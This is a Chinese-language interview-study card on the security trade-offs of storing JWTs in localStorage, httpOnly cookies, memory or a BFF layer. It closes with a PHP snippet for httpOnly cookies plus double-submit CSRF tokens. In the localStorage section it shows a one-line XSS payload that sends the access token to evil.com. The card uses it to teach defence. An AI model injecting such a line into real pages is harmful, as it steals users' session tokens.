---
title: JWT 存储位置安全权衡
difficulty: L3
frequency: 高
tags: [安全, JWT, localStorage, Cookie, httpOnly, XSS, CSRF, SameSite, BFF, PHP]
needs_verification: false
created: 2026-05-23
---

# [L3] JWT 存储位置安全权衡

#### 一句话结论

> 无绝对安全的存储方案：localStorage 防 CSRF 但裸露于 XSS；httpOnly Cookie 防 XSS 但需额外抵御 CSRF；内存存储安全性最高但无持久化。

---

#### 体系讲解

**1. 威胁模型前置**

讨论存储方案前必须明确两类主要威胁：

- **XSS（跨站脚本）**：攻击者在目标域注入并执行恶意 JS，可读取 JS 可访问的一切数据（包括 localStorage、sessionStorage、非 httpOnly Cookie）
- **CSRF（跨站请求伪造）**：攻击者在第三方页面诱导用户浏览器向目标域发送携带 Cookie 的请求，无需读取 Cookie 值本身

这两类威胁在存储选择上形成反向制衡——对一个的防御往往增加另一个的暴露面。

---

**2. 三种存储方案详解**

**方案 A：localStorage / sessionStorage**

浏览器的键值存储，JS 完全可读写，无域限制（同源可读）。

```
攻击面分析：
XSS 风险  ██████████ 高 —— document.cookie 读不到，但 localStorage.getItem('token') 可直接读取
CSRF 风险  ░░░░░░░░░░ 无 —— 浏览器发送请求时不会自动携带 localStorage 内容
持久化    ██████████ 强 —— sessionStorage 随标签关闭清除，localStorage 永久保留直到手动清除
```

XSS 攻击者只需一行即可窃取：
```javascript
fetch('https://evil.com/steal?t=' + localStorage.getItem('access_token'));
```

由于 JWT 本身含用户身份信息，XSS 一旦发生等同于账号完全沦陷。

**方案 B：httpOnly Cookie**

`Set-Cookie: token=<jwt>; HttpOnly; Secure; SameSite=Lax`

`HttpOnly` 属性使 JS 的 `document.cookie` 无法读取该 Cookie，XSS 无法直接窃取令牌值。

```
攻击面分析：
XSS 风险  ░░░░░░░░░░ 低 —— JS 无法读取 httpOnly Cookie 的值
CSRF 风险  ████████░░ 中高 —— 浏览器发请求自动携带，需 SameSite + CSRF Token 防御
持久化    ██████░░░░ 中 —— Expires/Max-Age 控制，可跨标签/关闭后保留
```

配合 `SameSite=Strict` 可完全阻断跨站请求携带 Cookie；`SameSite=Lax`（Chrome 默认）仍允许顶层 GET 导航携带，对状态变更接口应叠加 CSRF Token。

**方案 C：内存存储（JS 变量 / React State / Redux）**

Token 仅存储在 JS 运行时内存中，页面刷新或标签关闭后即丢失。

```
攻击面分析：
XSS 风险  ████░░░░░░ 较低 —— XSS 仍可劫持当前运行时并读取内存，但无法跨会话持久
CSRF 风险  ░░░░░░░░░░ 无 —— 不经 Cookie 发送，无自动携带
持久化    ░░░░░░░░░░ 无 —— 刷新即失，需配合 silent refresh 或重新登录
```

---

**3. 权衡矩阵**

| 维度 | localStorage | httpOnly Cookie | 内存存储 |
|---|---|---|---|
| XSS 可窃取 Token | ✅ 直接窃取 | ❌ JS 不可读 | ⚠️ 仅限当前运行时 |
| CSRF 风险 | ❌ 无（需手动带 Header） | ✅ 需额外防御 | ❌ 无 |
| 跨标签共享 | ✅ 支持 | ✅ 支持 | ❌ 不支持 |
| 页面刷新后有效 | ✅ 有效 | ✅ 有效 | ❌ 失效 |
| 实现复杂度 | 低 | 中（需 CSRF 防御） | 高（需 silent refresh） |
| 适用场景 | 无敏感操作的内容站 | 多数 Web 应用 | 高安全金融/政务场景 |

---

**4. httpOnly Cookie 的 CSRF 防御组合**

单独 httpOnly Cookie 不足够，需搭配：

```
防御层次（推荐叠加）：
1. SameSite=Strict / Lax  → 阻断大多数跨站请求
2. CSRF Double-Submit Cookie 或 Synchronizer Token → 验证请求来源意图
3. 关键操作再次验证（密码确认/MFA）→ 即使 Cookie 被 CSRF 滥用，高风险操作仍受保护
```

---

**5. BFF 架构：彻底隔离 Token**

Backend for Frontend（BFF）是更彻底的隔离方案：

```
用户浏览器  ──Cookie(session_id)──▶  BFF 服务（Node/PHP）
                                         │
                                         │ Token 存在 BFF 服务端 Session 中
                                         │（浏览器从未接触原始 JWT）
                                         │
                                    ─────▼─────
                                    后端 API（Bearer JWT）
```

BFF 作为 Token 的保管方，浏览器只持有无意义的 Session Cookie（httpOnly），即使 XSS 成功，也只能冒用当前会话而无法拿走 JWT 去访问 API。代价是引入了 BFF 这一额外的服务层，增加了运维和延迟成本。

---

#### 考察意图

考察候选人能否摆脱"用 httpOnly Cookie 就安全"的误区，理解 XSS 和 CSRF 的威胁模型差异，在给定业务场景（SPA/SSR/高安全要求）下做出有依据的权衡选择，并知道 BFF 架构是如何在架构层面解决问题的。

---

#### 追问链

1. **SPA 场景下 localStorage 真的无法接受吗？有没有缓解措施？**  
   风险不可消除，只能缓解。措施包括：① 严格的 CSP（`Content-Security-Policy`）限制内联脚本和外部脚本来源，减少 XSS 注入面；② Token 生命周期尽量短（如 15 分钟），配合 refresh token 轮转，窃取到的 Token 很快失效；③ 将 access token 绑定到用户 IP 或设备指纹（有副作用，移动端 IP 变化频繁）。但对高价值业务（金融、医疗），这些缓解措施仍不够，应切换为 httpOnly Cookie 或 BFF。

2. **httpOnly Cookie 在移动端 Native App 中如何处理？**  
   Native App 没有"浏览器自动携带 Cookie"的机制，CSRF 天然不存在。但 Cookie 管理也需手动实现（如 Android 的 `CookieManager`）。更常见的做法是 Native App 直接使用 Bearer Token 存储在 Keychain（iOS）或 Keystore（Android）中，这比 Web 的所有存储方案都更安全，因为操作系统级别的密钥存储有硬件加密保护。

3. **BFF 架构中 BFF 层本身被攻击怎么办？**  
   BFF 收窄了攻击面，但自身成为高价值目标。需要：① BFF 与后端 API 之间走内网，Token 不经过公网；② BFF 存储的 Token 应是最小权限的（用户级 scope）；③ BFF Session 本身加 httpOnly + Secure，并设置短过期时间配合 Redis TTL；④ BFF 部署时实施严格的网络隔离和最小权限原则。BFF 被攻陷的影响范围是单用户会话，而非全量 JWT 密钥。

4. **如果同时需要防 XSS 和 CSRF，除了 BFF 还有哪些方案？**  
   ① `__Host-` 前缀 Cookie（强制 Secure + Path=/，防子域名劫持）配合 CSRF Token；② 使用 `Sec-Fetch-Site` 请求头做服务端校验（浏览器自动发送，JS 不可伪造，但老浏览器不支持）；③ 短期 Token（≤15 min）+ refresh token 轮转，降低任何存储方式被利用的时间窗口。

---

#### 易错点

1. **"httpOnly Cookie 防 XSS"的表述不准确**：httpOnly 防的是 JS 读取 Cookie **值**，而非防止 XSS 攻击本身。XSS 仍可执行任意操作（发起已认证请求、读取页面 DOM、键盘记录等），只是无法拿到 Cookie 的原始字符串。这一区别在讨论 XSS 影响范围时非常重要。

2. **误以为 localStorage 完全不受 CSRF 影响**：localStorage 不会被浏览器自动携带，但若前端代码将 Token 读出并放入请求头（如 `Authorization: Bearer <token>`），CSRF 攻击确实无法通过简单的表单提交伪造此请求头，这一点是正确的。错误在于认为"不受 CSRF 影响"就等于"安全"，忽略了 XSS 是 localStorage 更严重的威胁。

3. **混淆 SameSite=Lax 与 CSRF 完全防御**：SameSite=Lax 不能替代 CSRF Token。Lax 仍允许 `<a>` 标签触发的顶层导航 GET 请求携带 Cookie，而 SameSite=Strict 会破坏合法的跨站导航体验（如从邮件链接跳转到已登录的站点）。对于 POST/DELETE 等状态变更接口，Lax 是有效的，但"仅靠 SameSite 不传 CSRF Token"的做法在架构层面脆弱，不推荐。

---

#### 代码示例

```php
<?php
// PHP 服务端：安全设置 JWT 到 httpOnly Cookie，并配合 CSRF Double-Submit

function issueTokenCookie(string $jwt, int $ttl = 900): void
{
    // HttpOnly: JS 不可读；Secure: 仅 HTTPS；SameSite=Lax: 防大多数 CSRF
    setcookie('access_token', $jwt, [
        'expires'  => time() + $ttl,
        'path'     => '/',
        'secure'   => true,
        'httponly' => true,
        'samesite' => 'Lax',
    ]);

    // Double-Submit CSRF Token：可读的同名 Cookie（无 httpOnly），前端读出后放入请求头
    $csrfToken = bin2hex(random_bytes(16));
    setcookie('csrf_token', $csrfToken, [
        'expires'  => time() + $ttl,
        'path'     => '/',
        'secure'   => true,
        'httponly' => false,  // 前端 JS 需要读取此值
        'samesite' => 'Lax',
    ]);
}

function verifyCsrfDoubleSubmit(): bool
{
    $cookieToken  = $_COOKIE['csrf_token'] ?? '';
    $headerToken  = $_SERVER['HTTP_X_CSRF_TOKEN'] ?? '';
    // 两者均非空且恒定时间比较一致
    return $cookieToken !== '' && hash_equals($cookieToken, $headerToken);
}

// 前端配合（JavaScript 伪代码）：
// const csrf = document.cookie.match(/csrf_token=([^;]+)/)?.[1];
// fetch('/api/data', { headers: { 'X-CSRF-Token': csrf } });
```
